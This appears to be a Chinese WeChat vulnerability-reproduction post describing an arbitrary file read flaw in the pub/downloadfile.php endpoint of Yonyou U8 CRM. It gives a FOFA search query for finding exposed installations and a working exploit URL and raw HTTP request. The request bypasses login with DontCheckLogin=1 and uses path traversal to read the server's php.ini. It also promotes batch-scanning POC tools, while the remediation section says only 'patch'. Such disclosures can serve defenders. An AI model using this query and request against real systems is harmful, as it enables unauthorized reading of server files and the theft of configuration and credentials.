#  用友crm客户关系管理pub/downloadfile.php接口存在任意文件读取漏洞   
南风徐来  南风漏洞复现文库   2024-05-05 23:20  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 用友crm客户关系管理简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友U8客户关系管理全面解决方案是基于中国企业最佳营销管理实践，更符合中国企业营销管理特点，客户关系管理的整合营销平台。产品融合数年来积累的知识、方法和经验，目标是帮助企业有效获取商机、提升营销能力。  
## 2.漏洞描述  
  
用友U8客户关系管理全面解决方案是基于中国企业最佳营销管理实践，更符合中国企业营销管理特点，客户关系管理的整合营销平台。用友crm pub/downloadfile.php接口存在任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友U8 CRM  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YicjgtsjRkxic8PODKtkk6nLPCED5vN7mULE3ibZmCCib2tC9abrAKAkibrPHrGfib6zbtYbSfMic2CjY6w/640?wx_fmt=jpeg&from=appmsg "null")  
  
用友crm客户关系管理pub/downloadfile.php接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
app="用友U8CRM"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini  
  
漏洞数据包：  
```
GET /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YicjgtsjRkxic8PODKtkk6nL9S6OsDVQAnNrMPj7dGXGURzHnMlmdIyb1oGdmEvwMp03rMCqH0Mk7Q/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YicjgtsjRkxic8PODKtkk6nLqwUfhon6VEWPJhDkqRwPZISBCm7dnlvXlP3icmicmsApiaMU2xZgQssibg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YicjgtsjRkxic8PODKtkk6nL3cXHd9iaK0AjFlUnGdl5tLxgyicConjR5oFmDqOyaYyvlibQIsMZGdibVg/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YicjgtsjRkxic8PODKtkk6nLM9fgh9iavunltCKAOxPdUHaefAaWkibkgwkzG4tOwcGzJxUurVJLXVTA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YicjgtsjRkxic8PODKtkk6nL0abPicn8eCc9KQgEwT7U86sxKB07Q1gkic22YmjTURxBJ8BKZoY8GQmQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YicjgtsjRkxic8PODKtkk6nLBY8nGxB98YwOzzoWDbbAljI3p4ay6YKDLgHibd4IgXeH7XKO0z92d7Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YicjgtsjRkxic8PODKtkk6nLnWpwUFnAuL9pHib4LRADwDMetDPGUHo5ps7tgVcoWSkj4pV3dpBGFCA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
[用友政务财务系统FileDownload接口存在任意文件读取漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486371&idx=1&sn=8ea4470a40d2100d18aecb3a4abcff6c&chksm=974b86a4a03c0fb2dad3b970bae511a25e02796d939379b41cee9a8372a421337989e1d432ef&scene=21#wechat_redirect)  
  
  
[泛微e-office系统UserSelect接口存在未授权访问漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486348&idx=1&sn=d432918c3ca047ca2d86b05d23cbe883&chksm=974b868ba03c0f9d74f2553ceed392dff8d314056dccf798398e00dfd4fce3e068dfeb49ce4e&scene=21#wechat_redirect)  
  
  
  
  
